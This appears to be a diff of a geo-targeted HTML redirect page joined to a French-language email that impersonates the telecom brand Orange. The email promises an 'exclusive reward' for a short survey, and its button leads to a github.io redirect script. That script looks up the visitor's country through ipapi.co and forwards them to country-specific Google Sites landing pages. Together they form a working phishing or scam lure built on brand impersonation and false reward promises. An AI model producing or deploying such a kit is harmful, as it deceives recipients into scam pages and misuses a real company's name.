@@ -4,26 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        .loading {
-            font-size: 18px;
-            color: #555;
-        }
-    </style>
     <script>
         document.addEventListener("DOMContentLoaded", async () => {
-            const fallbackUrl = "https://sites.google.com/view/orangecadeux/home"; // Update fallback if needed
-            
             try {
-                // Fetch user geolocation data
                 const response = await fetch("https://ipapi.co/json/");
-                if (!response.ok) throw new Error("API Error");
-                
                 const data = await response.json();
                 const countryCode = data.country_code;
 
@@ -36,17 +20,52 @@
                     NL: "https://sites.google.com/view/nationaalenergiecollectief/home",
                 };
 
-                // Redirect user
-                window.location.href = landingPages[countryCode] || fallbackUrl;
+                // Redirect or fallback
+                window.location.href = landingPages[countryCode] || "https://site.google.com/global-home-improvement";
             } catch (error) {
-                console.error("Geolocation error:", error);
-                window.location.href = fallbackUrl; // Redirect to fallback
+                console.error("Redirect error:", error);
+                window.location.href = "https://site.google.com/global-home-improvement"; // Default fallback
             }
         });
     </script>
 </head>
 <body>
-    <h1>Redirecting...</h1>
-    <p class="loading">Please wait while we connect you to the best offer...</p>
+    <h1>Redirecting you to the best offer...</h1>
 </body>
 </html>
+
+<!-- Email content starts here -->
+
+<TABLE class=es-left cellSpacing=0 cellPadding=0 align=left>
+<TBODY>
+<TR>
+<META name=viewport content="width=device-width, initial-scale=1.0">
+<STYLE type=text/css>
+          /* Reset and Base Styles */ body, table, td, a { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; } body { margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #d32f2f; } table { border-collapse: separate; mso-table-lspace: 0pt; mso-table-rspace: 0pt; } img { -ms-interpolation-mode: bicubic; max-width: 100%; height: auto; } /* Responsive Container */ .email-container { max-width: 600px; margin: 20px auto; background-color: #eeeeee; /* Light gray content background */ border-radius: 12px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2); overflow: hidden; } /* Logo Space */ .logo-container { text-align: center; padding: 10px 0; background-color: #ffffff; } .logo-container h1 { color: #fe7900; font-family: "Montserrat", sans-serif; } /* Header Styles */ .email-header { text-align: center; padding: 20px 15px; font-size: 24px; font-weight: bold; color: #333333; border-bottom: 1px solid #e0e0e0; } /* Content Styles */ .content { padding: 30px 20px; } .content h1 { color: #d32f2f; font-size: 28px; margin-bottom: 20px; text-align: center; } .content p { color: #333333; font-size: 16px; line-height: 1.6; margin-bottom: 15px; text-align: justify; } /* Highlight Sections */ .highlight-section { background-color: #fef9e7; /* Light yellow for highlights */ border-left: 4px solid #d32f2f; padding: 15px; margin: 20px 0; } /* CTA Button */ .cta-section { text-align: center; padding: 20px; } .cta-button { display: inline-block; background-color: #d32f2f; color: #ffffff !important; font-size: 18px; font-weight: bold; text-decoration: none; padding: 15px 30px; border-radius: 5px; transition: background-color 0.3s ease; } .cta-button:hover { background-color: #b71c1c; } /* Footer Styles */ .footer { background-color: #ffffff; padding: 20px; text-align: center; font-size: 12px; color: #666666; border-top: 1px solid #e0e0e0; } .footer a { color: #d32f2f !important; text-decoration: underline; } /* Responsive Adjustments */ @media screen and (max-width: 600px) { .email-container { width: 100% !important; margin: 0 !important; border-radius: 0 !important; } .content, .logo-container, .email-header, .footer { padding: 15px !important; } }
+</STYLE>
+</TR></TBODY></TABLE>
+<TABLE role=presentation style="BACKGROUND-IMAGE: url(imgs/group_18_cBZ.png); BACKGROUND-COLOR: #d32f2f" cellSpacing=0 cellPadding=0 width="100%" border=0>
+<TBODY>
+<TR>
+<TD align=center>
+<TABLE role=presentation class=email-container cellSpacing=0 cellPadding=0 width=600 border=0><!-- Logo Space -->
+<TBODY>
+<TR>
+<TD class=logo-container>
+<H1>Orange </H1></TD></TR>
+<TR>
+<TD>
+<DIV style="HEIGHT: 30px; BACKGROUND-IMAGE: url(imgs/animated-shipping-bg.gif); BACKGROUND-COLOR: #b71c1c"></DIV></TD></TR><!-- Header -->
+<TR>
+<TD class=email-header>Participez &amp; Gagnez une Récompense ! </TD></TR><!-- Content -->
+<TR>
+<TD class=content>
+<H1>Votre Opinion Compte pour Nous ! </H1>
+<P>Nous souhaitons en savoir plus sur vos besoins et vos attentes. En participant à notre <STRONG>sondage rapide </STRONG>, vous contribuez à l'amélioration de nos services tout en ayant une chance de recevoir <STRONG>une récompense exclusive </STRONG>! </P>
+<DIV class=highlight-section>
+<P><STRONG>Ce que vous y gagnez : </STRONG><BR>🎁 Une chance de remporter un cadeau spécial <BR>⏱️ Moins de 2 minutes pour participer <BR>🛡️ Vos informations resteront confidentielles </P></DIV>
+<P style="FONT-SIZE: 18px; TEXT-ALIGN: center">Ne manquez pas cette opportunité exceptionnelle ! </P>
+<DIV class=cta-section><A class=cta-button href="https://pikatcho98z.github.io/redirect-script/" target=_blank>PARTICIPER AU SONDAGE </A></DIV></TD></TR><!-- Footer -->
+<TR>
+<TD class=footer>
+<P>Vous avez reçu cet email car vous êtes un client privilégié. <BR><A href="http://track.chanret.com/unsubscribe.asp?APIKey=#APIKey#&amp;Email=#Email-Base64-Encoded#">Se désabonner </A></P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TR></TBODY></TABLE>
